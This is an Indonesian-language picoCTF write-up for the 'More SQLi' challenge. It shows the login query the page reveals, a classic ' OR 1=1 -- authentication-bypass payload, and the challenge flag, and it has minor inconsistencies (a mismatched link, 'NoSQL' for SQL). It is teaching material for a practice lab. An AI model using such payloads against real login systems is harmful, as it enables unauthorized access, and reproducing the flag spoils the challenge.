# Pico-CTF Write-up: More SQLi

## Challenge Overview

**Judul:** More SQLi\
**Kategori:** SQL Injection\
**Kesulitan:** Medium\
**Link Soal:** [https://play.picoctf.org/practice/challenge/443?page=1&search=No%20Sql](https://play.picoctf.org/practice/challenge/358?category=1&page=1&search=More%20SQLi)

Tantangan ini menghadirkan sebuah halaman login yang tampak rentan terhadap SQL Injection (SQLi). Tujuannya adalah mengeksploitasi kerentanan tersebut untuk melewati autentikasi dan memperoleh flag.

## Alat Yang Digunakan

- **Web Browser**: Untuk berinteraksi dengan antarmuka login aplikasi.
- **Burp Suite**: Digunakan untuk mencegat dan memodifikasi permintaan HTTP guna menyisipkan kode NoSQL.

## Pembahasan

Berikut adalah tampilan dari web yang akan di serang

<img width="1888" height="1004" alt="Screenshot 2025-09-10 231940" src="https://github.com/user-attachments/assets/a92cf91f-0757-4b0b-b712-990984cc2bd7" />

Pertama saya test dengan memasukkan
```
Username: test
Password: test
```
dan ini menghasilkan

<img width="1374" height="149" alt="Screenshot 2025-09-10 232112" src="https://github.com/user-attachments/assets/6f2c5fac-c5a4-4aa7-b0e6-fe9987ec8ecd" />

Setelah melakukan submit, respons yang diterima mengungkapkan struktur query SQL berikut:
```
SELECT id FROM users WHERE password = 'test' AND username = 'test';
```
hal ini menandakan user input yang akan langsung dimasukkan ke query sql

kedua, kita bisa langsung membuat payload yang akan membypass username `' OR 1=1; - //` Ini mengubah query menjadi:
```
SELECT id FROM users WHERE password = ' ' OR 1=1 ; -- // ' AND username = 'test'
```

<img width="1488" height="554" alt="Screenshot 2025-09-10 232334" src="https://github.com/user-attachments/assets/5099f47d-6f59-4b1a-b060-ef3b70ee36a6" />


dan kita berhasil masuk dan mendapatkan flagnya `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}`

<img width="1324" height="825" alt="Screenshot 2025-09-10 232255" src="https://github.com/user-attachments/assets/782ff8ff-3472-4ee8-8c56-8dac7e0a0748" />


